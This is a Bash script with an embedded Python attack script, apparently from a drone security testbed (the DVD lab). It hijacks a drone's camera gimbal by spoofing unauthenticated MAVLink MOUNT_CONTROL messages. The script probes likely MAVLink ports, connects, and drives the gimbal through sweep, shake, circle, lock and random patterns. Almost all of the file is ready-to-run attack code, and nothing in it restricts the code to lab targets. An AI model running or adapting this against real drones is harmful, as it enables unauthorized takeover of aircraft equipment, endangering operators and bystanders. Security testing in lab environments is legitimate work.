#!/bin/bash
# camera_gimbal_takeover.sh - Camera Gimbal Takeover Attack for DVD
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/injection/camera_gimbal_takeover.sh
# Purpose: Hijacking gimbal control using spoofed MAVLink MOUNT_CONTROL messages

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Camera Gimbal Takeover"
TARGET_IP="10.13.0.3"
TARGET_PORT="5760"
PYTHON_SCRIPT="/tmp/gimbal_takeover_attack.py"
LOG_FILE="$(get_log_dir)/camera_gimbal_takeover.log"

# Gimbal movement patterns
declare -A GIMBAL_PATTERNS=(
    ["sweep"]="Sweep Pattern - Left/Right scanning"
    ["shake"]="Shake Pattern - Erratic movement"
    ["circle"]="Circle Pattern - 360-degree rotation"
    ["lock_down"]="Lock Down - Point camera down"
    ["lock_up"]="Lock Up - Point camera up"
    ["random"]="Random Pattern - Unpredictable movement"
)

print_attack_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}        Camera Gimbal Takeover Attack      ${NC}"
    echo -e "${CYAN}============================================${NC}"
    echo -e "${YELLOW}Target: DVD Camera Gimbal System${NC}"
    echo -e "${YELLOW}Method: MAVLink MOUNT_CONTROL Spoofing${NC}"
    echo -e "${YELLOW}Impact: Camera Control Hijacking${NC}"
    echo ""
}

check_environment() {
    log_info "Checking environment and prerequisites..."
    
    # 루트 권한 확인
    if [ "$EUID" -ne 0 ]; then
        log_error "This script must be run as root"
        exit 1
    fi
    
    # Python 및 필수 패키지 확인
    if ! command -v python3 >/dev/null 2>&1; then
        log_error "Python3 is required but not installed"
        log_info "Install with: sudo apt-get install python3 python3-pip"
        exit 1
    fi
    
    # pymavlink 설치 확인 및 설치
    if ! python3 -c "import pymavlink" 2>/dev/null; then
        log_warning "pymavlink not found, installing..."
        pip3 install pymavlink >/dev/null 2>&1
        
        if [ $? -eq 0 ]; then
            log_success "pymavlink installed successfully"
        else
            log_error "Failed to install pymavlink"
            exit 1
        fi
    else
        log_success "pymavlink is available"
    fi
    
    # DVD 환경 확인
    if is_dvd_environment; then
        log_success "DVD environment detected"
    else
        log_warning "DVD environment not detected, using default settings"
    fi
    
    return 0
}

detect_targets() {
    log_info "Detecting DVD drone and gimbal targets..."
    
    # 일반적인 DVD 타겟들
    local targets=(
        "10.13.0.3:5760"    # Companion Computer
        "10.13.0.2:5760"    # Flight Controller  
        "192.168.13.14:5760" # WiFi Mode
        "127.0.0.1:5760"    # Local SITL
    )
    
    echo -e "${YELLOW}Scanning for MAVLink targets with gimbal support...${NC}"
    
    for target in "${targets[@]}"; do
        local ip=$(echo "$target" | cut -d':' -f1)
        local port=$(echo "$target" | cut -d':' -f2)
        
        echo -ne "Testing $target... "
        
        # 포트 연결 테스트
        if timeout 3 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null; then
            echo -e "${GREEN}✓ Available${NC}"
            TARGET_IP="$ip"
            TARGET_PORT="$port"
            log_success "Target found: $TARGET_IP:$TARGET_PORT"
            return 0
        else
            echo -e "${RED}✗ Not available${NC}"
        fi
    done
    
    log_warning "No available targets found, using default: $TARGET_IP:$TARGET_PORT"
    return 0
}

create_gimbal_attack_script() {
    log_info "Creating gimbal takeover Python script..."
    
    cat > "$PYTHON_SCRIPT" << 'EOF'
#!/usr/bin/env python3
"""
Camera Gimbal Takeover Attack Script for DVD
Hijacks gimbal control using MAVLink MOUNT_CONTROL messages
"""

from pymavlink import mavutil
import sys
import time
import math
import random
import signal
import threading

class GimbalTakeoverAttack:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.master = None
        self.running = False
        self.attack_count = 0
        
    def connect_drone(self):
        """Connect to the drone via MAVLink"""
        try:
            connection_string = f'tcp:{self.target_ip}:{self.target_port}'
            print(f"[*] Connecting to {connection_string}...")
            
            self.master = mavutil.mavlink_connection(connection_string, timeout=5)
            
            # Wait for heartbeat with timeout
            print("[*] Waiting for heartbeat...")
            heartbeat = self.master.wait_heartbeat(timeout=10)
            
            if heartbeat:
                print(f"[+] Connected to drone (System ID: {self.master.target_system})")
                print(f"[+] Target Component: {self.master.target_component}")
                return True
            else:
                print("[-] No heartbeat received")
                return False
                
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def send_gimbal_command(self, pitch=0, roll=0, yaw=0, mode=2):
        """Send MAVLink MOUNT_CONTROL message"""
        try:
            # Convert degrees to centidegrees
            pitch_cd = int(pitch * 100)
            roll_cd = int(roll * 100) 
            yaw_cd = int(yaw * 100)
            
            self.master.mav.mount_control_send(
                self.master.target_system,
                self.master.target_component,
                pitch_cd,   # pitch in centidegrees
                roll_cd,    # roll in centidegrees
                yaw_cd,     # yaw in centidegrees
                mode        # MAV_MOUNT_MODE
            )
            
            print(f"[>] Gimbal command sent: pitch={pitch}°, roll={roll}°, yaw={yaw}°")
            self.attack_count += 1
            return True
            
        except Exception as e:
            print(f"[-] Failed to send gimbal command: {e}")
            return False
    
    def sweep_pattern(self, duration=30):
        """Execute sweep pattern attack"""
        print(f"[*] Starting sweep pattern for {duration} seconds...")
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            # Sweep left to right
            for yaw in range(-90, 91, 10):
                if not self.running:
                    break
                self.send_gimbal_command(pitch=0, yaw=yaw)
                time.sleep(0.2)
            
            # Sweep right to left
            for yaw in range(90, -91, -10):
                if not self.running:
                    break
                self.send_gimbal_command(pitch=0, yaw=yaw)
                time.sleep(0.2)
    
    def shake_pattern(self, duration=20):
        """Execute shake pattern attack"""
        print(f"[*] Starting shake pattern for {duration} seconds...")
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            # Random erratic movements
            pitch = random.randint(-30, 30)
            roll = random.randint(-20, 20)
            yaw = random.randint(-45, 45)
            
            self.send_gimbal_command(pitch=pitch, roll=roll, yaw=yaw)
            time.sleep(random.uniform(0.1, 0.3))
    
    def circle_pattern(self, duration=25):
        """Execute circular pattern attack"""
        print(f"[*] Starting circle pattern for {duration} seconds...")
        start_time = time.time()
        angle = 0
        
        while time.time() - start_time < duration and self.running:
            # Calculate circular motion
            yaw = 60 * math.sin(math.radians(angle))
            pitch = 30 * math.cos(math.radians(angle))
            
            self.send_gimbal_command(pitch=pitch, yaw=yaw)
            
            angle += 10
            if angle >= 360:
                angle = 0
            
            time.sleep(0.2)
    
    def lock_position(self, pitch=-90, yaw=0, duration=15):
        """Lock gimbal in specific position"""
        print(f"[*] Locking gimbal at pitch={pitch}°, yaw={yaw}° for {duration} seconds...")
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            self.send_gimbal_command(pitch=pitch, yaw=yaw)
            time.sleep(1)
    
    def random_pattern(self, duration=30):
        """Execute random movement pattern"""
        print(f"[*] Starting random pattern for {duration} seconds...")
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            pitch = random.randint(-90, 30)
            roll = random.randint(-30, 30)
            yaw = random.randint(-180, 180)
            
            self.send_gimbal_command(pitch=pitch, roll=roll, yaw=yaw)
            time.sleep(random.uniform(0.5, 2.0))
    
    def execute_attack_sequence(self):
        """Execute full attack sequence"""
        print("[*] Starting gimbal takeover attack sequence...")
        
        # Pattern 1: Sweep
        if self.running:
            self.sweep_pattern(15)
        
        # Pattern 2: Shake
        if self.running:
            time.sleep(2)
            self.shake_pattern(10)
        
        # Pattern 3: Lock down
        if self.running:
            time.sleep(2)
            self.lock_position(pitch=-90, duration=8)
        
        # Pattern 4: Circle
        if self.running:
            time.sleep(2)
            self.circle_pattern(15)
        
        # Pattern 5: Random
        if self.running:
            time.sleep(2)
            self.random_pattern(20)
        
        # Reset to center
        if self.running:
            print("[*] Resetting gimbal to center position...")
            self.send_gimbal_command(pitch=0, roll=0, yaw=0)
    
    def run_attack(self, pattern="sequence"):
        """Run the specified attack pattern"""
        if not self.connect_drone():
            return False
        
        self.running = True
        
        try:
            if pattern == "sequence":
                self.execute_attack_sequence()
            elif pattern == "sweep":
                self.sweep_pattern(30)
            elif pattern == "shake":
                self.shake_pattern(20)
            elif pattern == "circle":
                self.circle_pattern(25)
            elif pattern == "lock_down":
                self.lock_position(pitch=-90, duration=20)
            elif pattern == "lock_up":
                self.lock_position(pitch=45, duration=20)
            elif pattern == "random":
                self.random_pattern(30)
            else:
                print(f"[-] Unknown pattern: {pattern}")
                return False
            
            print(f"[+] Attack completed! Total commands sent: {self.attack_count}")
            return True
            
        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user")
            return False
        except Exception as e:
            print(f"[-] Attack failed: {e}")
            return False
        finally:
            self.running = False
            if self.master:
                self.master.close()

def signal_handler(sig, frame):
    print('\n[!] Interrupt received, stopping attack...')
    sys.exit(0)

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 gimbal_takeover_attack.py <ip:port> [pattern]")
        print("Patterns: sequence, sweep, shake, circle, lock_down, lock_up, random")
        sys.exit(1)
    
    # Parse arguments
    target = sys.argv[1]
    pattern = sys.argv[2] if len(sys.argv) > 2 else "sequence"
    
    try:
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
    except ValueError:
        print("[-] Invalid target format. Use ip:port")
        sys.exit(1)
    
    # Setup signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Create and run attack
    attack = GimbalTakeoverAttack(target_ip, target_port)
    success = attack.run_attack(pattern)
    
    if success:
        print("[+] Gimbal takeover attack completed successfully")
    else:
        print("[-] Gimbal takeover attack failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
EOF

    chmod +x "$PYTHON_SCRIPT"
    log_success "Gimbal attack script created: $PYTHON_SCRIPT"
}

execute_gimbal_attack() {
    local pattern="${1:-sequence}"
    
    log_info "Executing gimbal takeover attack with pattern: $pattern"
    
    echo -e "${YELLOW}Starting Camera Gimbal Takeover...${NC}"
    echo -e "${RED}Target: $TARGET_IP:$TARGET_PORT${NC}"
    echo -e "${RED}Pattern: $pattern${NC}"
    echo ""
    
    # Python 공격 스크립트 실행
    python3 "$PYTHON_SCRIPT" "$TARGET_IP:$TARGET_PORT" "$pattern" 2>&1 | tee -a "$LOG_FILE"
    local exit_code=${PIPESTATUS[0]}
    
    if [ $exit_code -eq 0 ]; then
        log_success "Gimbal takeover attack completed successfully"
        return 0
    else
        log_error "Gimbal takeover attack failed"
        return 1
    fi
}

show_attack_menu() {
    echo -e "${BLUE}Available Gimbal Attack Patterns:${NC}"
    echo ""
    
    local i=1
    for pattern in sequence sweep shake circle lock_down lock_up random; do
        local description="${GIMBAL_PATTERNS[$pattern]}"
        printf "%d) ${GREEN}%-12s${NC} - %s\n" "$i" "$pattern" "$description"
        ((i++))
    done
    
    echo ""
    echo -e "${YELLOW}Enter pattern number (1-7) or 'q' to quit:${NC} "
    read -r choice
    
    case $choice in
        1) execute_gimbal_attack "sequence" ;;
        2) execute_gimbal_attack "sweep" ;;
        3) execute_gimbal_attack "shake" ;;
        4) execute_gimbal_attack "circle" ;;
        5) execute_gimbal_attack "lock_down" ;;
        6) execute_gimbal_attack "lock_up" ;;
        7) execute_gimbal_attack "random" ;;
        q|Q) exit 0 ;;
        *) 
            log_error "Invalid choice"
            show_attack_menu
            ;;
    esac
}

cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up gimbal takeover attack...${NC}"
    
    # Python 프로세스 정리
    pkill -f "gimbal_takeover_attack.py" 2>/dev/null
    
    # 임시 파일 정리
    rm -f "$PYTHON_SCRIPT"
    
    echo -e "${GREEN}[✓] Cleanup complete${NC}"
    exit 0
}

main() {
    print_attack_banner
    
    # 환경 확인
    check_environment
    
    # 타겟 탐지
    detect_targets
    
    # 공격 스크립트 생성
    create_gimbal_attack_script
    
    # 파라미터 처리
    if [ $# -eq 0 ]; then
        # 대화형 메뉴
        show_attack_menu
    else
        # 명령행 인수로 패턴 지정
        local pattern="$1"
        execute_gimbal_attack "$pattern"
    fi
    
    # 정리
    cleanup
}

# SIGINT 시그널 처리
trap cleanup SIGINT SIGTERM

# 스크립트가 직접 실행될 때만 main 함수 호출
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi